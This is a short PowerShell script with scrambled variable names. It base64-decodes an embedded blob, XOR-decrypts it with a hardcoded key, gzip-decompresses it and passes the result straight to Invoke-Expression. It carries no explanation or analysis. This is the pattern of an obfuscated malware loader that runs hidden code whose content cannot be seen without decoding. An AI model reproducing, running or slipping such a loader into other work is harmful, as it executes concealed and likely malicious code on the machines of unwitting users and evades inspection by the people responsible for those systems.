$v6hcf2ixogpa0qr = [System.Text.Encoding]::ascii
function b76v4ij5w3r9zn1ea8xp2fqcuho  {param($cvkdfpt9yhr0l6u )
  $ebly63zs1wd45qt = [System.Convert]::FromBase64String($cvkdfpt9yhr0l6u)
  $2usc9kqylmjrg6b= $v6hcf2ixogpa0qr.GetBytes("qadpwen0m498")
    $qmayfnjsguzek9o = $ebly63zs1wd45qt
    $4tyajir8203vzwl = $(for ($p26rjb1imn895og = 0; $p26rjb1imn895og -lt $qmayfnjsguzek9o.length; ) {
        for ($fr4db12j6kz03c5 = 0; $fr4db12j6kz03c5 -lt $2usc9kqylmjrg6b.length; $fr4db12j6kz03c5++) {
            $qmayfnjsguzek9o[$p26rjb1imn895og] -bxor $2usc9kqylmjrg6b[$fr4db12j6kz03c5]
            $p26rjb1imn895og++
            if ($p26rjb1imn895og -ge $qmayfnjsguzek9o.Length) {
                $fr4db12j6kz03c5 = $2usc9kqylmjrg6b.length
            }
        }
    })
	$98evtlf46irob30 = New-Object System.IO.MemoryStream( , $4tyajir8203vzwl )

	    $236xuq1gdhfnpia = New-Object System.IO.MemoryStream
        $wkj1qvuz59ym2h8 = New-Object System.IO.Compression.GzipStream $98evtlf46irob30, ([IO.Compression.CompressionMode]::Decompress)
	    $wkj1qvuz59ym2h8.CopyTo( $236xuq1gdhfnpia )
        $wkj1qvuz59ym2h8.Close()
		$98evtlf46irob30.Close()
		[byte[]] $wozj9h24t5ex7vm = $236xuq1gdhfnpia.ToArray()
 $cefxyvw417qiuao=$wozj9h24t5ex7vm
    return $cefxyvw417qiuao
}
[byte[]]$28wmvobpas9r5zl=b76v4ij5w3r9zn1ea8xp2fqcuho $s6jiw5t3opezm1g
[System.Text.Encoding]::ascii.GetString((b76v4ij5w3r9zn1ea8xp2fqcuho "bupscHdlbjBpNLRtqhPHSGcYMJqVM6yy3IGRMJaOiGIUhAocgA/4vbLQXYvz4K00Q6liMfOVQ9MSq9/ataCXYN9nulrwCkSCVDUh9Qz/HHffvJr8FLJtO6pxzyc4dUn9NfE0p59BNkc2r52JBbr5F45sBxH4St3ue05JUSmPFTTwl8jbS/BQRDARS332D6jzyZYQCj136QGevvPGK7Mgt3YWya5S1S3vQ2t9euxH0/QoMkR+6USjnq06jmokEjZt0JP14Pg37nWyzWR8DSDhdPguf7UQpulWyhXN0qCvaodWuuNLObc3TjzZGnOKE+j/Ql/kXnb8Jg3ygDhwosb1cH6HCGehEjQug4L3PpOk4kXrOpV+UW686HaA8MSiZDTVODfEPjK+8wT3h9dEEtT4Pv4/29bFUQxnoMs6hY1ekm+EBpfKDCOiFHIhGNCOHtFrdNHWzikaUa9a/7geb1ywlFGqjLAcKt1o5SuWn6AJsbaI0w/XrzaXLkJatKXWEVwHnV5h5d6FwZDHhmznnrZlP1NsbGUUHR/OnmMiJUMk1gtQ46gJ+nkjyhnINKYE9sqc94ssN6HPs/irqedWrayjD7WdaTLP8joYNUBWXtXxJeQFFonH/z+i/jih/cYQb3qBe7tQVqUiiWjOSEhyk7lB4gtOjFM4Pd4W8puDPsiAkH6tHK6k9ZWYGJ4i5wzHK6BMNO4wNadVNGDutbsQ9nq9s8wKEagc5vGvdy0m7GsOeZHj+TSzAFfZZMe1piD84gVm9+oMYuSBKkRbdeA2l0lOhXCP4aBOKDMquUGHXrxkCTFdBscdMCtrQOfUxRenwk+eBM/ck+GMrwccaVqM/0hWOOW1fsZT9lx/fZ/lU1/pa31/HJtBuGP+lESdImWroeDHKF1hdx95FRVoRd0Qi61gBRNBuEosxyoS5KFRcDeevCVjjQiryFVyysD/9+Z1SOfS8erq0a7EncZe9EZlfZnUES6mFcueYYZFCLh/KEAuidq3z9bTtNyJrLqDra4K6eE3hreEUY4fgx2Sgl7O3LzT9srAvY6AO5fIqhjKWgbRyhKcXSkYP/aicB+45xjrZ0CF2mGiaXgdT9N7rBhU3gNC8N8mwZHdm/z5qNSP9Mop3Hs4MkUpvMiVVROmnPf/vaJyWxM0Y7FkejgQVYXtjW94bKfY4khMHKhosf+UomcFASiZ55Z6ZHpKr+vJtqEKsdAfV+UYWihibjA="))|iex;